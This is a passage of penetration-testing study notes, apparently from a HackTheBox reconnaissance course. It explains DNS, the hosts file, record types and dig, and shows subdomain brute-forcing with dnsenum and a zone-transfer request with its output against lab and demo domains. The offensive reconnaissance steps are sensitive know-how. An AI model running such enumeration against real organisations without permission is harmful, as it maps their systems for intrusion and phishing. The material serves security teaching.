    <p>These name servers are all within the <code class="language-plaintext highlighter-rouge">facebook.com</code> domain, suggesting that Meta Platforms, Inc. manages its DNS infrastructure. It is common practice for large organizations to maintain control and reliability over their DNS resolution.</p>
  </li>
</ol>

<p>Overall, the WHOIS output for <code class="language-plaintext highlighter-rouge">facebook.com</code> aligns with expectations for a well-established and secure domain owned by a large organization like Meta Platforms, Inc.</p>

<p>While the WHOIS record provides contact information for domain-related issues, it might not be directly helpful in identifying individual employees or specific vulnerabilities. This highlights the need to combine WHOIS data with other reconnaissance techniques to understand the target’s digital footprint comprehensively.</p>

<h1 id="dns-1">DNS</h1>

<hr />

<p>The <code class="language-plaintext highlighter-rouge">Domain Name System</code> (<code class="language-plaintext highlighter-rouge">DNS</code>) acts as the internet’s GPS, guiding your online journey from memorable landmarks (domain names) to precise numerical coordinates (IP addresses).</p>

<h2 id="how-dns-works">How DNS Works</h2>

<p>Imagine you want to visit a website like <code class="language-plaintext highlighter-rouge">www.example.com</code>. You type this friendly domain name into your browser, but your computer doesn’t understand words – it speaks the language of numbers, specifically IP addresses. So, how does your computer find the website’s IP address? Enter DNS, the internet’s trusty translator.</p>

<p><img src="https://mermaid.ink/svg/pako:eNptkk1uwjAQha8y8rpcIItWkAAtUNQmlSrksDDxlEQQT-QfJIS4ex2nNG1arzx-n5-ex3NhBUlkEdtr0ZSwSnMFfhm36w425DTEVDfOou60do15XGJxMBCLosQtjEb3MLk8vcCMnJIP156ceA3WFIiYZ6ikgWSdwatDfQZLkKKh4wn1dnBngyZceuQxKYWFNS39jjtTWfyCvdsgb2t9c-wN4-CU_A7dy8mPjFOeYuG0qU4IK6KDa4bgLdjck9ZpZcC_20e7dWmYbRroGU-JLKxFjZCh7h88C_KCv62Sf9RFUJd87GxJurLCtsH-cssuUlfMu8blit2xGnUtKul_-NKKObMl1pizyG-l0Iec5erqOeEsZWdVsMhqh3dMk9uXLPoQR-Mr10hhMamE73L9fYqysqSfuwEKc3T9BOe0sj4" alt="" /></p>

<ol>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Your Computer Asks for Directions (DNS Query)</code>: When you enter the domain name, your computer first checks its memory (cache) to see if it remembers the IP address from a previous visit. If not, it reaches out to a DNS resolver, usually provided by your internet service provider (ISP).</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">The DNS Resolver Checks its Map (Recursive Lookup)</code>: The resolver also has a cache, and if it doesn’t find the IP address there, it starts a journey through the DNS hierarchy. It begins by asking a root name server, which is like the librarian of the internet.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Root Name Server Points the Way</code>: The root server doesn’t know the exact address but knows who does – the Top-Level Domain (TLD) name server responsible for the domain’s ending (e.g., .com, .org). It points the resolver in the right direction.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">TLD Name Server Narrows It Down</code>: The TLD name server is like a regional map. It knows which authoritative name server is responsible for the specific domain you’re looking for (e.g., <code class="language-plaintext highlighter-rouge">example.com</code>) and sends the resolver there.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Authoritative Name Server Delivers the Address</code>: The authoritative name server is the final stop. It’s like the street address of the website you want. It holds the correct IP address and sends it back to the resolver.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">The DNS Resolver Returns the Information</code>: The resolver receives the IP address and gives it to your computer. It also remembers it for a while (caches it), in case you want to revisit the website soon.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Your Computer Connects</code>: Now that your computer knows the IP address, it can connect directly to the web server hosting the website, and you can start browsing.</p>
  </li>
</ol>

<h3 id="the-hosts-file">The Hosts File</h3>

<p>The <code class="language-plaintext highlighter-rouge">hosts</code> file is a simple text file used to map hostnames to IP addresses, providing a manual method of domain name resolution that bypasses the DNS process. While DNS automates the translation of domain names to IP addresses, the <code class="language-plaintext highlighter-rouge">hosts</code> file allows for direct, local overrides. This can be particularly useful for development, troubleshooting, or blocking websites.</p>

<p>The <code class="language-plaintext highlighter-rouge">hosts</code> file is located in <code class="language-plaintext highlighter-rouge">C:\Windows\System32\drivers\etc\hosts</code> on Windows and in <code class="language-plaintext highlighter-rouge">/etc/hosts</code> on Linux and MacOS. Each line in the file follows the format:</p>

<p>For example:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
192.168.1.10    devserver.local
</code></pre></div></div>

<p>To edit the <code class="language-plaintext highlighter-rouge">hosts</code> file, open it with a text editor using administrative/root privileges. Add new entries as needed, and then save the file. The changes take effect immediately without requiring a system restart.</p>

<p>Common uses include redirecting a domain to a local server for development:</p>

<p>Code: txt</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       myapp.local
</code></pre></div></div>

<p>testing connectivity by specifying an IP address:</p>

<p>Code: txt</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.1.20    testserver.local
</code></pre></div></div>

<p>or blocking unwanted websites by redirecting their domains to a non-existent IP address:</p>

<p>Code: txt</p>

<pre><code class="language-txt">0.0.0.0       unwanted-site.com
</code></pre>

<h3 id="its-like-a-relay-race">It’s Like a Relay Race</h3>

<p>Think of the DNS process as a relay race. Your computer starts with the domain name and passes it along to the resolver. The resolver then passes the request to the root server, the TLD server, and finally, the authoritative server, each one getting closer to the destination. Once the IP address is found, it’s relayed back down the chain to your computer, allowing you to access the website.</p>

<h3 id="key-dns-concepts">Key DNS Concepts</h3>

<p>In the <code class="language-plaintext highlighter-rouge">Domain Name System</code> (<code class="language-plaintext highlighter-rouge">DNS</code>), a <code class="language-plaintext highlighter-rouge">zone</code> is a distinct part of the domain namespace that a specific entity or administrator manages. Think of it as a virtual container for a set of domain names. For example, <code class="language-plaintext highlighter-rouge">example.com</code> and all its subdomains (like <code class="language-plaintext highlighter-rouge">mail.example.com</code> or <code class="language-plaintext highlighter-rouge">blog.example.com</code>) would typically belong to the same DNS zone.</p>

<p>The zone file, a text file residing on a DNS server, defines the resource records (discussed below) within this zone, providing crucial information for translating domain names into IP addresses.</p>

<p>To illustrate, here’s a simplified example of what a zone file, for <code class="language-plaintext highlighter-rouge">example.com</code> might look like:</p>

<p>Code: zone</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$TTL</span> 3600 <span class="p">;</span> Default Time-To-Live <span class="o">(</span>1 hour<span class="o">)</span>
@       IN SOA   ns1.example.com. admin.example.com. <span class="o">(</span>
                2024060401 <span class="p">;</span> Serial number <span class="o">(</span>YYYYMMDDNN<span class="o">)</span>
                3600       <span class="p">;</span> Refresh interval
                900        <span class="p">;</span> Retry interval
                604800     <span class="p">;</span> Expire <span class="nb">time
                </span>86400 <span class="o">)</span>    <span class="p">;</span> Minimum TTL

@       IN NS    ns1.example.com.
@       IN NS    ns2.example.com.
@       IN MX 10 mail.example.com.
www     IN A     192.0.2.1
mail    IN A     198.51.100.1
ftp     IN CNAME www.example.com.
</code></pre></div></div>

<p>This file defines the authoritative name servers (<code class="language-plaintext highlighter-rouge">NS</code> records), mail server (<code class="language-plaintext highlighter-rouge">MX</code> record), and IP addresses (<code class="language-plaintext highlighter-rouge">A</code> records) for various hosts within the <code class="language-plaintext highlighter-rouge">example.com</code> domain.</p>

<p>DNS servers store various resource records, each serving a specific purpose in the domain name resolution process. Let’s explore some of the most common DNS concepts:</p>

<table>
  <thead>
    <tr>
      <th>DNS Concept</th>
      <th>Description</th>
      <th>Example</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Domain Name</code></td>
      <td>A human-readable label for a website or other internet resource.</td>
      <td><code class="language-plaintext highlighter-rouge">www.example.com</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">IP Address</code></td>
      <td>A unique numerical identifier assigned to each device connected to the internet.</td>
      <td><code class="language-plaintext highlighter-rouge">192.0.2.1</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">DNS Resolver</code></td>
      <td>A server that translates domain names into IP addresses.</td>
      <td>Your ISP’s DNS server or public resolvers like Google DNS (<code class="language-plaintext highlighter-rouge">8.8.8.8</code>)</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Root Name Server</code></td>
      <td>The top-level servers in the DNS hierarchy.</td>
      <td>There are 13 root servers worldwide, named A-M: <code class="language-plaintext highlighter-rouge">a.root-servers.net</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">TLD Name Server</code></td>
      <td>Servers responsible for specific top-level domains (e.g., .com, .org).</td>
      <td><a href="https://en.wikipedia.org/wiki/Verisign">Verisign</a> for <code class="language-plaintext highlighter-rouge">.com</code>, <a href="https://en.wikipedia.org/wiki/Public_Interest_Registry">PIR</a> for <code class="language-plaintext highlighter-rouge">.org</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Authoritative Name Server</code></td>
      <td>The server that holds the actual IP address for a domain.</td>
      <td>Often managed by hosting providers or domain registrars.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">DNS Record Types</code></td>
      <td>Different types of information stored in DNS.</td>
      <td>A, AAAA, CNAME, MX, NS, TXT, etc.</td>
    </tr>
  </tbody>
</table>

<p>Now that we’ve explored the fundamental concepts of DNS, let’s dive deeper into the building blocks of DNS information – the various record types. These records store different types of data associated with domain names, each serving a specific purpose:</p>

<table>
  <thead>
    <tr>
      <th>Record Type</th>
      <th>Full Name</th>
      <th>Description</th>
      <th>Zone File Example</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">A</code></td>
      <td>Address Record</td>
      <td>Maps a hostname to its IPv4 address.</td>
      <td><code class="language-plaintext highlighter-rouge">www.example.com.</code> IN A <code class="language-plaintext highlighter-rouge">192.0.2.1</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">AAAA</code></td>
      <td>IPv6 Address Record</td>
      <td>Maps a hostname to its IPv6 address.</td>
      <td><code class="language-plaintext highlighter-rouge">www.example.com.</code> IN AAAA <code class="language-plaintext highlighter-rouge">2001:db8:85a3::8a2e:370:7334</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">CNAME</code></td>
      <td>Canonical Name Record</td>
      <td>Creates an alias for a hostname, pointing it to another hostname.</td>
      <td><code class="language-plaintext highlighter-rouge">blog.example.com.</code> IN CNAME <code class="language-plaintext highlighter-rouge">webserver.example.net.</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">MX</code></td>
      <td>Mail Exchange Record</td>
      <td>Specifies the mail server(s) responsible for handling email for the domain.</td>
      <td><code class="language-plaintext highlighter-rouge">example.com.</code> IN MX 10 <code class="language-plaintext highlighter-rouge">mail.example.com.</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">NS</code></td>
      <td>Name Server Record</td>
      <td>Delegates a DNS zone to a specific authoritative name server.</td>
      <td><code class="language-plaintext highlighter-rouge">example.com.</code> IN NS <code class="language-plaintext highlighter-rouge">ns1.example.com.</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">TXT</code></td>
      <td>Text Record</td>
      <td>Stores arbitrary text information, often used for domain verification or security policies.</td>
      <td><code class="language-plaintext highlighter-rouge">example.com.</code> IN TXT <code class="language-plaintext highlighter-rouge">"v=spf1 mx -all"</code> (SPF record)</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">SOA</code></td>
      <td>Start of Authority Record</td>
      <td>Specifies administrative information about a DNS zone, including the primary name server, responsible person’s email, and other parameters.</td>
      <td><code class="language-plaintext highlighter-rouge">example.com.</code> IN SOA <code class="language-plaintext highlighter-rouge">ns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">SRV</code></td>
      <td>Service Record</td>
      <td>Defines the hostname and port number for specific services.</td>
      <td><code class="language-plaintext highlighter-rouge">_sip._udp.example.com.</code> IN SRV 10 5 5060 <code class="language-plaintext highlighter-rouge">sipserver.example.com.</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">PTR</code></td>
      <td>Pointer Record</td>
      <td>Used for reverse DNS lookups, mapping an IP address to a hostname.</td>
      <td><code class="language-plaintext highlighter-rouge">1.2.0.192.in-addr.arpa.</code> IN PTR <code class="language-plaintext highlighter-rouge">www.example.com.</code></td>
    </tr>
  </tbody>
</table>

<p>The “<code class="language-plaintext highlighter-rouge">IN</code>” in the examples stands for “Internet.” It’s a class field in DNS records that specifies the protocol family. In most cases, you’ll see “<code class="language-plaintext highlighter-rouge">IN</code>” used, as it denotes the Internet protocol suite (IP) used for most domain names. Other class values exist (e.g., <code class="language-plaintext highlighter-rouge">CH</code> for Chaosnet, <code class="language-plaintext highlighter-rouge">HS</code> for Hesiod) but are rarely used in modern DNS configurations.</p>

<p>In essence, “<code class="language-plaintext highlighter-rouge">IN</code>” is simply a convention that indicates that the record applies to the standard internet protocols we use today. While it might seem like an extra detail, understanding its meaning provides a deeper understanding of DNS record structure.</p>

<h2 id="why-dns-matters-for-web-recon">Why DNS Matters for Web Recon</h2>

<p>DNS is not merely a technical protocol for translating domain names; it’s a critical component of a target’s infrastructure that can be leveraged to uncover vulnerabilities and gain access during a penetration test:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Uncovering Assets</code>: DNS records can reveal a wealth of information, including subdomains, mail servers, and name server records. For instance, a <code class="language-plaintext highlighter-rouge">CNAME</code> record pointing to an outdated server (<code class="language-plaintext highlighter-rouge">dev.example.com</code> CNAME <code class="language-plaintext highlighter-rouge">oldserver.example.net</code>) could lead to a vulnerable system.</li>
  <li><code class="language-plaintext highlighter-rouge">Mapping the Network Infrastructure</code>: You can create a comprehensive map of the target’s network infrastructure by analysing DNS data. For example, identifying the name servers (<code class="language-plaintext highlighter-rouge">NS</code> records) for a domain can reveal the hosting provider used, while an <code class="language-plaintext highlighter-rouge">A</code> record for <code class="language-plaintext highlighter-rouge">loadbalancer.example.com</code> can pinpoint a load balancer. This helps you understand how different systems are connected, identify traffic flow, and pinpoint potential choke points or weaknesses that could be exploited during a penetration test.</li>
  <li><code class="language-plaintext highlighter-rouge">Monitoring for Changes</code>: Continuously monitoring DNS records can reveal changes in the target’s infrastructure over time. For example, the sudden appearance of a new subdomain (<code class="language-plaintext highlighter-rouge">vpn.example.com</code>) might indicate a new entry point into the network, while a <code class="language-plaintext highlighter-rouge">TXT</code> record containing a value like <code class="language-plaintext highlighter-rouge">_1password=...</code> strongly suggests the organization is using 1Password, which could be leveraged for social engineering attacks or targeted phishing campaigns.</li>
</ul>

<h2 id="the-domain-information-groper">The Domain Information Groper</h2>

<p>The <code class="language-plaintext highlighter-rouge">dig</code> command (<code class="language-plaintext highlighter-rouge">Domain Information Groper</code>) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records. Its flexibility and detailed and customizable output make it a go-to choice.</p>

<h3 id="common-dig-commands">Common dig Commands</h3>

<p>| Command                         | Description                                                                                                                                                                                          |
| ——————————- | —————————————————————————————————————————————————————————————————- |
| <code class="language-plaintext highlighter-rouge">dig domain.com</code>                | Performs a default A record lookup for the domain.                                                                                                                                                   |
| <code class="language-plaintext highlighter-rouge">dig domain.com A</code>              | Retrieves the IPv4 address (A record) associated with the domain.                                                                                                                                    |
| <code class="language-plaintext highlighter-rouge">dig domain.com AAAA</code>           | Retrieves the IPv6 address (AAAA record) associated with the domain.                                                                                                                                 |
| <code class="language-plaintext highlighter-rouge">dig domain.com MX</code>             | Finds the mail servers (MX records) responsible for the domain.                                                                                                                                      |
| <code class="language-plaintext highlighter-rouge">dig domain.com NS</code>             | Identifies the authoritative name servers for the domain.                                                                                                                                            |
| <code class="language-plaintext highlighter-rouge">dig domain.com TXT</code>            | Retrieves any TXT records associated with the domain.                                                                                                                                                |
| <code class="language-plaintext highlighter-rouge">dig domain.com CNAME</code>          | Retrieves the canonical name (CNAME) record for the domain.                                                                                                                                          |
| <code class="language-plaintext highlighter-rouge">dig domain.com SOA</code>            | Retrieves the start of authority (SOA) record for the domain.                                                                                                                                        |
| <code class="language-plaintext highlighter-rouge">dig @1.1.1.1 domain.com</code>       | Specifies a specific name server to query; in this case 1.1.1.1                                                                                                                                      |
| <code class="language-plaintext highlighter-rouge">dig +trace domain.com</code>         | Shows the full path of DNS resolution.                                                                                                                                                               |
| <code class="language-plaintext highlighter-rouge">dig -x 192.168.1.1</code>            | Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.                                                                     |
| <code class="language-plaintext highlighter-rouge">dig +short domain.com</code>         | Provides a short, concise answer to the query.                                                                                                                                                       |
| <code class="language-plaintext highlighter-rouge">dig +noall +answer domain.com</code> | Displays only the answer section of the query output.                                                                                                                                                |
| <code class="language-plaintext highlighter-rouge">dig domain.com ANY</code>            | Retrieves all available DNS records for the domain (Note: Many DNS servers ignore <code class="language-plaintext highlighter-rouge">ANY</code> queries to reduce load and prevent abuse, as per <a href="https://datatracker.ietf.org/doc/html/rfc8482">RFC 8482</a>). |</p>
<h1 id="subdomain-bruteforcing">Subdomain Bruteforcing</h1>

<hr />

<p><code class="language-plaintext highlighter-rouge">Subdomain Brute-Force Enumeration</code> is a powerful active subdomain discovery technique that leverages pre-defined lists of potential subdomain names. This approach systematically tests these names against the target domain to identify valid subdomains. By using carefully crafted wordlists, you can significantly increase the efficiency and effectiveness of your subdomain discovery efforts.</p>

<p>The process breaks down into four steps:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">Wordlist Selection</code>: The process begins with selecting a wordlist containing potential subdomain names. These wordlists can be:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">General-Purpose</code>: Containing a broad range of common subdomain names (e.g., <code class="language-plaintext highlighter-rouge">dev</code>, <code class="language-plaintext highlighter-rouge">staging</code>, <code class="language-plaintext highlighter-rouge">blog</code>, <code class="language-plaintext highlighter-rouge">mail</code>, <code class="language-plaintext highlighter-rouge">admin</code>, <code class="language-plaintext highlighter-rouge">test</code>). This approach is useful when you don’t know the target’s naming conventions.</li>
      <li><code class="language-plaintext highlighter-rouge">Targeted</code>: Focused on specific industries, technologies, or naming patterns relevant to the target. This approach is more efficient and reduces the chances of false positives.</li>
      <li><code class="language-plaintext highlighter-rouge">Custom</code>: You can create your own wordlist based on specific keywords, patterns, or intelligence gathered from other sources.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">Iteration and Querying</code>: A script or tool iterates through the wordlist, appending each word or phrase to the main domain (e.g., <code class="language-plaintext highlighter-rouge">example.com</code>) to create potential subdomain names (e.g., <code class="language-plaintext highlighter-rouge">dev.example.com</code>, <code class="language-plaintext highlighter-rouge">staging.example.com</code>).</li>
  <li><code class="language-plaintext highlighter-rouge">DNS Lookup</code>: A DNS query is performed for each potential subdomain to check if it resolves to an IP address. This is typically done using the A or AAAA record type.</li>
  <li><code class="language-plaintext highlighter-rouge">Filtering and Validation</code>: If a subdomain resolves successfully, it’s added to a list of valid subdomains. Further validation steps might be taken to confirm the subdomain’s existence and functionality (e.g., by attempting to access it through a web browser).Code: bash</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsenum <span class="nt">--enum</span> inlanefreight.com <span class="nt">-f</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-r</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>dnsenum <span class="nt">--enum</span> inlanefreight.com <span class="nt">-f</span>  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 

dnsenum VERSION:1.2.6

<span class="nt">-----</span>   inlanefreight.com   <span class="nt">-----</span>


Host<span class="s1">'s addresses:
__________________

inlanefreight.com.                       300      IN    A        134.209.24.248

[...]

Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:
_______________________________________________________________________________________

www.inlanefreight.com.                   300      IN    A        134.209.24.248
support.inlanefreight.com.               300      IN    A        134.209.24.248
[...]


done.
</span></code></pre></div></div>

<h1 id="dns-zone-transfers">DNS Zone Transfers</h1>

<hr />

<p>While brute-forcing can be a fruitful approach, there’s a less invasive and potentially more efficient method for uncovering subdomains – DNS zone transfers. This mechanism, designed for replicating DNS records between name servers, can inadvertently become a goldmine of information for prying eyes if misconfigured.</p>

<h2 id="what-is-a-zone-transfer">What is a Zone Transfer</h2>

<p>A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. This process is essential for maintaining consistency and redundancy across DNS servers. However, if not adequately secured, unauthorised parties can download the entire zone file, revealing a complete list of subdomains, their associated IP addresses, and other sensitive DNS data.![[dns_axfr.png]]</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">Zone Transfer Request (AXFR)</code>: The secondary DNS server initiates the process by sending a zone transfer request to the primary server. This request typically uses the AXFR (Full Zone Transfer) type.</li>
  <li><code class="language-plaintext highlighter-rouge">SOA Record Transfer</code>: Upon receiving the request (and potentially authenticating the secondary server), the primary server responds by sending its Start of Authority (SOA) record. The SOA record contains vital information about the zone, including its serial number, which helps the secondary server determine if its zone data is current.</li>
  <li><code class="language-plaintext highlighter-rouge">DNS Records Transmission</code>: The primary server then transfers all the DNS records in the zone to the secondary server, one by one. This includes records like A, AAAA, MX, CNAME, NS, and others that define the domain’s subdomains, mail servers, name servers, and other configurations.</li>
  <li><code class="language-plaintext highlighter-rouge">Zone Transfer Complete</code>: Once all records have been transmitted, the primary server signals the end of the zone transfer. This notification informs the secondary server that it has received a complete copy of the zone data.</li>
  <li><code class="language-plaintext highlighter-rouge">Acknowledgement (ACK)</code>: The secondary server sends an acknowledgement message to the primary server, confirming the successful receipt and processing of the zone data. This completes the zone transfer process.</li>
</ol>

<p>The information gleaned from an unauthorised zone transfer can be invaluable to an attacker. It reveals a comprehensive map of the target’s DNS infrastructure, including:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Subdomains</code>: A complete list of subdomains, many of which might not be linked from the main website or easily discoverable through other means. These hidden subdomains could host development servers, staging environments, administrative panels, or other sensitive resources.</li>
  <li><code class="language-plaintext highlighter-rouge">IP Addresses</code>: The IP addresses associated with each subdomain, providing potential targets for further reconnaissance or attacks.</li>
  <li><code class="language-plaintext highlighter-rouge">Name Server Records</code>: Details about the authoritative name servers for the domain, revealing the hosting provider and potential misconfigurations.</li>
</ul>

<h4 id="exploiting-zone-transfers">Exploiting Zone Transfers</h4>

<p>You can use the <code class="language-plaintext highlighter-rouge">dig</code> command to request a zone transfer:</p>

<p>DNS Zone Transfers</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>dig axfr @nsztm1.digi.ninja zonetransfer.me
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>dig axfr @nsztm1.digi.ninja zonetransfer.me

<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.18.12-1~bpo11+1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr @nsztm1.digi.ninja zonetransfer.me
<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>
<span class="p">;;</span> global options: +cmd
zonetransfer.me.  7200  IN  SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600
zonetransfer.me.  300 IN  HINFO <span class="s2">"Casio fx-700G"</span> <span class="s2">"Windows XP"</span>
zonetransfer.me.  301 IN  TXT <span class="s2">"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"</span>
zonetransfer.me.  7200  IN  MX  0 ASPMX.L.GOOGLE.COM.
...
zonetransfer.me.  7200  IN  A 5.196.105.14
zonetransfer.me.  7200  IN  NS  nsztm1.digi.ninja.
zonetransfer.me.  7200  IN  NS  nsztm2.digi.ninja.
_acme-challenge.zonetransfer.me. 301 IN TXT <span class="s2">"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI"</span>
_sip._tcp.zonetransfer.me. 14000 IN SRV 0 0 5060 www.zonetransfer.me.
14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me.
asfdbauthdns.zonetransfer.me. 7900 IN AFSDB 1 asfdbbox.zonetransfer.me.
asfdbbox.zonetransfer.me. 7200  IN  A 127.0.0.1
asfdbvolume.zonetransfer.me. 7800 IN  AFSDB 1 asfdbbox.zonetransfer.me.
canberra-office.zonetransfer.me. 7200 IN A  202.14.81.230
...
<span class="p">;;</span> Query <span class="nb">time</span>: 10 msec
<span class="p">;;</span> SERVER: 81.4.108.41#53<span class="o">(</span>nsztm1.digi.ninja<span class="o">)</span> <span class="o">(</span>TCP<span class="o">)</span>
<span class="p">;;</span> WHEN: Mon May 27 18:31:35 BST 2024
<span class="p">;;</span> XFR size: 50 records <span class="o">(</span>messages 1, bytes 2085<span class="o">)</span>
</code></pre></div></div>

<h1 id="virtual-hosts">Virtual Hosts</h1>

<hr />

<p>Once the DNS directs traffic to the correct server, the web server configuration becomes crucial in determining how the incoming requests are handled. Web servers like Apache, Nginx, or IIS are designed to host multiple websites or applications on a single server. They achieve this through virtual hosting, which allows them to differentiate between domains, subdomains, or even separate websites with distinct content.</p>

<h2 id="understanding-vhosts-and-subdomains">Understanding VHosts and Subdomains</h2>

<p>At the core of <code class="language-plaintext highlighter-rouge">virtual hosting</code> is the ability of web servers to distinguish between multiple websites or applications sharing the same IP address. This is achieved by leveraging the <strong><code class="language-plaintext highlighter-rouge">HTTP Host</code> header</strong>, a piece of information included in every <code class="language-plaintext highlighter-rouge">HTTP</code> request sent by a web browser.</p>

<p>The key difference between <code class="language-plaintext highlighter-rouge">VHosts</code> and <code class="language-plaintext highlighter-rouge">subdomains</code> is their relationship to the <code class="language-plaintext highlighter-rouge">Domain Name System (DNS)</code> and the web server’s configuration.</p>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">Subdomains</code></strong>: These are extensions of a main domain name (e.g., <code class="language-plaintext highlighter-rouge">blog.example.com</code> is a subdomain of <code class="language-plaintext highlighter-rouge">example.com</code>). <code class="language-plaintext highlighter-rouge">Subdomains</code> typically have their own <code class="language-plaintext highlighter-rouge">DNS records</code>, pointing to either the same IP address as the main domain or a different one. They can be used to organise different sections or services of a website.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">Virtual Hosts</code> (<code class="language-plaintext highlighter-rouge">VHosts</code>)</strong>: Virtual hosts are configurations within a web server that allow multiple websites or applications to be hosted on a single server. They can be associated with top-level domains (e.g., <code class="language-plaintext highlighter-rouge">example.com</code>) or subdomains (e.g., <code class="language-plaintext highlighter-rouge">dev.example.com</code>). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.</li>
</ul>

<p>example apache.conf</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apacheconf
# Example of name-based virtual host configuration in Apache
&lt;VirtualHost *:80&gt;
    ServerName www.example1.com
    DocumentRoot /var/www/example1
&lt;/VirtualHost&gt;

&lt;VirtualHost *:80&gt;
    ServerName www.example2.org
    DocumentRoot /var/www/example2
&lt;/VirtualHost&gt;

&lt;VirtualHost *:80&gt;
    ServerName www.another-example.net
    DocumentRoot /var/www/another-example
&lt;/VirtualHost&gt;

</code></pre></div></div>

<h3 id="server-vhost-lookup">Server VHost Lookup</h3>

<p>The following illustrates the process of how a web server determines the correct content to serve based on the <code class="language-plaintext highlighter-rouge">Host</code> header:</p>

<p><img src="https://mermaid.ink/svg/pako:eNqNUsFuwjAM_ZUop00CPqAHDhubuCBNBW2XXrzUtNFap3McOoT496WUVUA3aTkltp_f84sP2rgcdaI9fgYkgwsLBUOdkYqnARZrbAMk6oFd65HHiTd8XyPvfku9WpYA1dJ5eXS0tcW4ZOFMqJEkdU4y6vNnqul8PvRO1HKzeVFpp9KLumvbdmapAsItoy1KmRlX3_fwAXTd4OkLakuoOjVqiZAj_7_PaJJEPVvK1QrElJYK1UcDg1h3HmOEmV4LSlEC0-CA6i24Zb406IRhizuM7BV6BVFCit4FNuh77GX9DeGfmEu-s_mD4b5x5PH2Y4aqhfVNBftufomsGemJrpFrsHncqkOHy7SUWGOmk3jNgT8yndEx1kEQt96T0YlwwIlmF4pSJ1uofHyFJgf52cchirkVx6t-aU-7e_wG--_4bQ" alt="" /></p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">Browser Requests a Website</code>: When you enter a domain name (e.g., <code class="language-plaintext highlighter-rouge">www.inlanefreight.com</code>) into your browser, it initiates an HTTP request to the web server associated with that domain’s IP address.</li>
  <li><code class="language-plaintext highlighter-rouge">Host Header Reveals the Domain</code>: The browser includes the domain name in the request’s <code class="language-plaintext highlighter-rouge">Host</code> header, which acts as a label to inform the web server which website is being requested.</li>
  <li><code class="language-plaintext highlighter-rouge">Web Server Determines the Virtual Host</code>: The web server receives the request, examines the <code class="language-plaintext highlighter-rouge">Host</code> header, and consults its virtual host configuration to find a matching entry for the requested domain name.</li>
  <li><code class="language-plaintext highlighter-rouge">Serving the Right Content</code>: Upon identifying the correct virtual host configuration, the web server retrieves the corresponding files and resources associated with that website from its document root and sends them back to the browser as the HTTP response.</li>
</ol>

<p>In essence, the <code class="language-plaintext highlighter-rouge">Host</code> header functions as a switch, enabling the web server to dynamically determine which website to serve based on the domain name requested by the browser.</p>

<h2 id="virtual-host-discovery-tools">Virtual Host Discovery Tools</h2>

